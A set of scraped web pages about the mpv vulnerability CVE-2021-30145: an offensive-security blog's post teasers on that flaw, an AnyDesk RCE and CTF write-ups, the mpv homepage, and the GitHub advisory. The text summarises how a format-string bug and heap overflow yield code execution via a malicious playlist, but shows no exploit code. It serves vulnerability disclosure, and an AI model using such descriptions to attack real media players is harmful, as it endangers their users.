[Previous PostPrevious   HACKvent20 writeup](https://devel0pment.de/?p=2084)[Next PostNext Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from mpv.io_3cd23fba_20250115_113127.html ===


* [Installation](/installation)

* [Reference](/manual)
* [Bug Reports](/bug-reports)
* [Community](/community)

# mpv

a free, open source, and cross-platform media player

![Screenshot of mpv playing a movie](/images/mpv-screenshot-0935decb.png)

## Overview

mpv is a free (as in freedom) media player for the command line. It supports
a wide variety of media file formats, audio and video codecs, and subtitle types.

#### Scripting

Powerful scripting capabilities can make the player do almost anything. There is
a large selection of
[user scripts on the wiki](https://github.com/mpv-player/mpv/wiki/User-Scripts).

#### On Screen Controller

While mpv strives for minimalism and provides no real GUI, it has a small controller on top of the video
for basic control.

#### High quality video output

mpv has an OpenGL, Vulkan, and D3D11 based video output that is capable of many features
loved by videophiles, such as video scaling with popular high quality
algorithms, color management, frame timing, interpolation, HDR, and more.

#### GPU video decoding

mpv can leverage most hardware decoding APIs on all platforms. Hardware
decoding can be enabled at runtime on demand.

#### Embeddable

A straightforward
[C API](https://github.com/mpv-player/mpv/blob/master/libmpv/client.h)
was designed from the ground up to make mpv usable as a library and
facilitate easy integration into other applications.

#### Active development

mpv is under active development, focusing on code refactoring and
cleanups as well as adding features. Want a feature?
[Post a patch or request it!](https://github.com/mpv-player/mpv/issues)

## Here are a few places you may want to go next...

---

[### Installation](/installation)

[### Source Code Repository](https://github.com/mpv-player/mpv)

© 2012-2025 mpv.io



=== Content from devel0pment.de_f9e45f82_20250115_113125.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: exploitation

Posted on [13. May 202113. May 2021](https://devel0pment.de/?p=2282)
## [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

![](https://devel0pment.de/wp-content/uploads/2021/04/he21_title.png)

HackyEaster was awesome again. From a technical point of view there weren’t too much new things, but the creativity of the provided challenges made it really fun. Including the little teaser challenge there were a total amount of 37 challenges. These challenges were divided into different levels. You could only proceed to the next level, if you have earned enough points in the current level. I really liked that new idea.

[Continue reading “Hacky Easter 2021 writeup”](https://devel0pment.de/?p=2282#more-2282)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [1. January 202124. January 2021](https://devel0pment.de/?p=2084)
## [HACKvent20 writeup](https://devel0pment.de/?p=2084)

|  | This year’s [HACKvent](https://hacking-lab.com) hosted on [competition.hacking-lab.com](https://competition.hacking-lab.com) has been as great as every year.There was a total amount of 28 awesome challenges with varying difficulties. |
| --- | --- |

| |  | [HV20.(-1) Twelve steps of christmas](?p=2084#_1) | | --- | --- | |  | [HV20.01 Happy HACKvent 2020](?p=2084#01) | |  | [HV20.02 Chinese Animals](?p=2084#02) | |  | [HV20.03 Packed gifts](?p=2084#03) | |  | [HV20.04 Br❤celet](?p=2084#04) | |  | [HV20.05 Image DNA](?p=2084#05) | | |  | [HV20.13 Twelve steps of christmas](?p=2084#13) | | --- | --- | |  | [HV20.14 Santa’s Special GIFt](?p=2084#14) | |  | [HV20.15 Man Commands, Server Lost](?p=2084#15) | |  | [HV20.16 Naughty Rudolph](?p=2084#16) | |  | [HV20.17 Santa’s Gift Factory Control](?p=2084#17) | |  | [HV20.18 Santa’s lost home](?p=2084#18) | |  | [HV20.19 Docker Linter Service](?p=2084#19) | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| |  | [HV20.06 Twelve steps of christmas](?p=2084#06) | | --- | --- | |  | [HV20.07 Bad morals](?p=2084#07) | |  | [HV20.08 The game](?p=2084#08) | |  | [HV20.09 Santa’s Gingerbread Factory](?p=2084#09) | |  | [HV20.10 Be patient with the adjacent](?p=2084#10) | |  | [HV20.11 Chris’mas carol](?p=2084#11) | |  | [HV20.12 Wiener waltz](?p=2084#12) | | |  | [HV20.20 Twelve steps of Christmas](?p=2084#20) | | --- | --- | |  | [HV20.21 Threatened Cat](?p=2084#21) | |  | [HV20.22 Padawanlock](?p=2084#22) | |  | [HV20.23 Those who make backups are cowards!](?p=2084#23) | |  | [HV20.24 Santa’s Secure Data Storage](?p=2084#24) | |  | [HV20.H1 It’s a secret!](?p=2084#h1) | |  | [HV20.H2 Oh, another secret!](?p=2084#h2) | |  | [HV20.H3 Hidden in Plain Sight](?p=2084#h3) | |

[Continue reading “HACKvent20 writeup”](https://devel0pment.de/?p=2084#more-2084)

Posted on [6. September 20206. September 2020](https://devel0pment.de/?p=2027)
## [ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

![](https://devel0pment.de/wp-content/uploads/2020/09/alles_logo.png)

The [ALLES! CTF](https://play.allesctf.net/) ([ctftime.org](https://ctftime.org/event/1091)) took place from 04/09/2020, 16:00 UTC to 06/09/2020, 19:00 UTC with a variety of interesting, creative challenges.

Within this article I want to share my writeup on the two challenges `Actual ASLR 1` and `2`, which were authored by [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w). What I especially liked about the challenge(s) is that you could make progression step by step even getting a first flag on the way to a full shell, which grants access to the second flag.

The article is divided into the following sections:

→[Actual ASLR 1](#aaslr1)
    – [Binary](#binary)
    – [Random Algorithm](#ranalg)
    – [Reimplementation In Python](#reimpl)
    – [First Flag](#firstflag)

→[Actual ASLR 2](#aaslr2)
    – [Custom Heap](#heap)
    – [Vulnerability](#vuln)
    – [Heap Leak](#heapleak)
    – [Image Base Leak](#imgleak)
    – [Overwriting Function Pointer](#overwrite)
    – [Final Exploit](#final)

---

[Continue reading “ALLES! CTF 2020 – Actual ASLR 1/2”](https://devel0pment.de/?p=2027#more-2027)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
## [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from github.com_cfd5474d_20250115_113122.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-mf25-jq7f-vx34)

**CVE-2021-30145**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-mf25-jq7f-vx34)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2021-30145](/advisories/GHSA-mf25-jq7f-vx34)

## A format string vulnerability in mpv through 0.33.0...

High severity

Unreviewed

Published
May 24, 2022
to the GitHub Advisory Database
•
Updated Jan 29, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-mf25-jq7f-vx34/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

A format string vulnerability in mpv through 0.33.0 allows user-assisted remote attackers to achieve code execution via a crafted m3u playlist file.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2021-30145>
* [mpv-player/mpv@d0c5309](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)
* <https://devel0pment.de/?p=2217>
* <https://github.com/mpv-player/mpv/releases/tag/v0.33.1>
* <https://mpv.io>
* <https://security.gentoo.org/glsa/202107-46>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-30145)
May 18, 2021

Published to the GitHub Advisory Database
May 24, 2022

Last updated
Jan 29, 2023

### Severity

High

7.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

2.088%
 (89th percentile)

### Weaknesses

[CWE-134](/advisories?query=cwe%3A134)

### CVE ID

CVE-2021-30145

### GHSA ID

GHSA-mf25-jq7f-vx34

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-mf25-jq7f-vx34/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


